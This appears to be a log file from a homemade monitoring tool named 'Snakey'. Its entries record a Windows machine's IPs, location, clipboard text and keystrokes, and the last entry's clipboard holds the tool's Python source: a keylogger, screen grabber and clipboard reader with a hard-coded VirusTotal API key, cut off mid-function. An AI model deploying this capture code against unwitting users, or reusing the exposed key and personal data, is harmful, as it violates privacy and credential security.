{"timestamp": "2025-05-19T11:37:45.476497", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "ea5701d1019b6189179b2757638423bcdda7df29e6680c96bceb086f328e1265", "log_hash": "2a91a4b549f3cc7ecc9366bb965eb826cd4503e2d032a509490d0883c19d3a3c"}
{"timestamp": "2025-05-19T11:38:12.084435", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3817dbd209fc084afa0fa06899836d9e7675eb55eae0551cf2a8f7f8a05c35b8", "log_hash": "8fd05417298f23e8a8ffa4a3a79e5101c859b8370eaca3e298e68a6ce4e69b5a"}
{"timestamp": "2025-05-19T11:38:38.606199", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "24d5ba38f6c93d96dd5582d8a5214c7e0fe631d68cefe277cb17f3b759ea7e19", "log_hash": "5b9e6c9178d576f719eb83eeafb6671fdc31d4481b4dc71bc8e6433ced7fb958"}
{"timestamp": "2025-05-19T11:39:05.387201", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e7cd6d72535fbf18459eafb42fd6c4dc0c9d2d2b4cd853575d56d6aa703731f4", "log_hash": "47841cc9908f8c04d916308fe6f8a452cead9c17b4a6389be4ab0f29e97c7fa2"}
{"timestamp": "2025-05-19T11:39:31.864813", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b2fbd9b81b2967159f29a38d72b7d81f2985c392a4ecb280ce893e7ecbad5b2a", "log_hash": "65e1561626889b449d5c796f2396a57565008c09fb893428a9f760af536826f9"}
{"timestamp": "2025-05-19T11:39:58.475814", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "38bb0a9e8554c5d8aabbc883d52d28f7337cfb56d06b0d97cc54fa728da1c98d", "log_hash": "0ef08001213fb6fbc99b11e0bb36727b2d8040e875e79b37c048c5ad824585cb"}
{"timestamp": "2025-05-19T11:40:25.002918", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b6a9b3509a90c12149ec66b030275ac6124428357ae81762851c976820627773", "log_hash": "f8318bd3eeac3645eb977ad91588dcb6cd9e24481b982afe5b87c7d006bc0654"}
{"timestamp": "2025-05-19T11:40:51.546165", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "179c966da5cf14127e0b7b237c12899fbb4a59ccdca62ec7c103c61b70fd351e", "log_hash": "c14eed1b585c5db7cad1367e173b952360d5012b09c1316d2fccaf3d824aa20b"}
{"timestamp": "2025-05-19T11:41:18.226042", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b574c36d5f5e8652b7d026291ae4560bad40bb3fda75aaa63d65b5c5ce464854", "log_hash": "f29350beb02a2245831579f5fd9d12084d2107f9c9a8c19407c00ffef4cfbbf4"}
{"timestamp": "2025-05-19T11:41:44.818565", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f9667327e5de5f07041c9e0673498c18fb6058e7ad15038c8dc092af20810713", "log_hash": "b5059f9c2f49fd36450ca77c2ee649d2ea780545ac4a947a1e21c555a43ce8d7"}
{"timestamp": "2025-05-19T11:42:11.821436", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "6c24844a711268c2e439c39b01e36191ccb0979930f3d7d0e79dec862945d0d0", "log_hash": "14ea0ea32ede1f4fb68d45ef2ab66776245be90ff256cf4d04bf51fec447d65f"}
{"timestamp": "2025-05-19T11:42:38.223988", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e6bc79021b735a1b1a5535e80e34956024054af400a7c66b6c6681c1ff050e84", "log_hash": "5faf3e837a5c4124f18f91695fcce4ac53f3c9ec2efc035bdcbe31b927266895"}
{"timestamp": "2025-05-19T17:22:53.623238", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "54f6b3f0c52a5f54f1fd91801975a0071e54b9dd641b3e9d09a5819e9842f5c1", "log_hash": "da1e37914fcb144a9c5d6a517b329ca86411cf9ca7a1665f52f9835c25dc51c2"}
{"timestamp": "2025-05-19T17:23:21.417586", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "1806cab5d209cd69b74ca4a32848b45b8a265e5d347e05d4d8980077f64b24b1", "log_hash": "5a294a1ebd44621fcf8199281645132611990b6fc2ddadcb862a3f9fe3c1db40"}
{"timestamp": "2025-05-19T17:23:47.951077", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "660ea60d36b0a723da4edc5ee071812bc7676c8d6e98af04cc22ee0bde4a12f8", "log_hash": "3bb6890423483e721e93bbbe50b4e4f6173654b50b196122374e29a83cf2271a"}
{"timestamp": "2025-05-19T17:24:15.399872", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "4bd226a19d7dcf28bc6baf71a42fe15959826007fbaadef157a06d5eb8044ace", "log_hash": "10b99c13d3726d368fc91ded592fad36cb51027dd5201bd3d1d9872f2bad20cc"}
{"timestamp": "2025-05-19T17:24:42.817004", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "i love you my wife bonita", "keystrokes": "\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "3fd5589e86632fff93f1a7c33e443854d9df91429aaf1baf659c558d4c04b61d", "screenshot_hash": "d5c536e61ead64238855a902d9b4cebad1827f8b5991fa1ce4f58899ab8b26b6", "log_hash": "2e65e630f536b765f812cf43feef0f185246118c7788f7a3458cbc42d69e00cd"}
{"timestamp": "2025-05-19T17:25:10.464372", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "i love you my wife bonita", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "3fd5589e86632fff93f1a7c33e443854d9df91429aaf1baf659c558d4c04b61d", "screenshot_hash": "61a6f8641384917d0fa5b479da8e84a30607991b9647fd8b8cc81da0d67ca5e1", "log_hash": "52be25488bf9b3fd7feb076a68454ef9ee990d8cd0d77076113d0776c8a559fc"}
{"timestamp": "2025-05-19T17:25:37.307524", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "i love you my wife bonita", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "3fd5589e86632fff93f1a7c33e443854d9df91429aaf1baf659c558d4c04b61d", "screenshot_hash": "caf2501475c662ae253438e9923d9c6012ccecf60cc43fb0ebe3ea166ae103fa", "log_hash": "cca48d285470d1e2fcf5db7c250b86eb0d7f659fc6479d245b01d0c246f8457e"}
{"timestamp": "2025-05-19T17:26:03.788231", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "i love you my wife bonita", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "3fd5589e86632fff93f1a7c33e443854d9df91429aaf1baf659c558d4c04b61d", "screenshot_hash": "45b470037c03012cb863c10d863ca2220c30b6bf5e89aa71a9c4181f0841d4c5", "log_hash": "d77503cbed303154cc9adeeea34f55b295e42a58edd8a4eceac35fb184d52809"}
{"timestamp": "2025-05-20T19:03:23.274208", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "st", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f83febd648296028a9df75f4024e92c24a4b9d602c1141cd840b9e4520e1aa61", "log_hash": "c153f996591f56228428c4c564210554307fba5001b2357508f2e2d245327f4b"}
{"timestamp": "2025-05-21T11:13:42.235591", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2578deca645c0575d10f7388ab18377976cbe9ce395ae2bfd666818f698ab89d", "log_hash": "4aaea8f71b58f68120f37feeb782ca681ad764f6197807d75df3d558c82eba27"}
{"timestamp": "2025-05-21T11:14:09.689281", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "8a33c5face76e8efe72bd70ab6ee86a2abb338366947036dd5a3f61e5053b89a", "log_hash": "4c2d81bfe4dc0239272c9027b230d74fdb70f75d8db516dfbdec7e5c59ff0e78"}
{"timestamp": "2025-05-21T11:14:36.484882", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bf30f06ffbd6ac60f32ee17f6e4d592e7693dff5c1c6c7384620ab60eae72fc2", "log_hash": "46216ece6f973fb497829f8730137ae25fcdeec98a8d8e650b12b7f41eda91fd"}
{"timestamp": "2025-05-21T11:15:02.892438", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "55f47b459cda0e63db372a51c97b594ff03a42644b7f26abf2ebbbad5d6abac2", "log_hash": "b7828fb48bb8efb9850302b62f7117d9f694ed4c41163bb33ef90d1b2419ef2b"}
{"timestamp": "2025-05-21T11:15:29.597205", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "cab7baf978853d3ef2861b941fb91f993cd858300263a1155ab2f74b95330a8a", "log_hash": "d419a3e63c6d6e5e10d84fd16efab04202879a858c591e10637001cb087fbed0"}
{"timestamp": "2025-05-21T11:15:56.189100", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "a5083b14c371818809771d092bb7177621d016b9f90dda71d2a2192fc97d6157", "log_hash": "291ceb3dd6a032aa564ed28639362275246d0a9c22fe33afefa4f0ea2807fff8"}
{"timestamp": "2025-05-21T11:26:23.151444", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2001:8a0:df46:3c00:c99:cdb4:5c2e:cb7f", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef get_public_ip_and_geolocation():\r\n    try:\r\n        ip_info = get(\"https://api64.ipify.org?format=json\").json()\r\n        ip = ip_info.get(\"ip\")\r\n        geo_response = get(f\"http://ip-api.com/json/{ip}\")\r\n        geo_data = geo_response.json()\r\n        return ip, geo_data.get(\"country\"), geo_data.get(\"city\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to get public IP or geolocation: {e}\")\r\n        return None, None, None\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        public_ip, country, city = get_public_ip_and_geolocation()\r\n        session_log[\"system\"][\"public_ip\"] = public_ip\r\n        session_log[\"system\"][\"country\"] = country\r\n        session_log[\"system\"][\"city\"] = city\r\n\r\n        if country and country not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {country}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            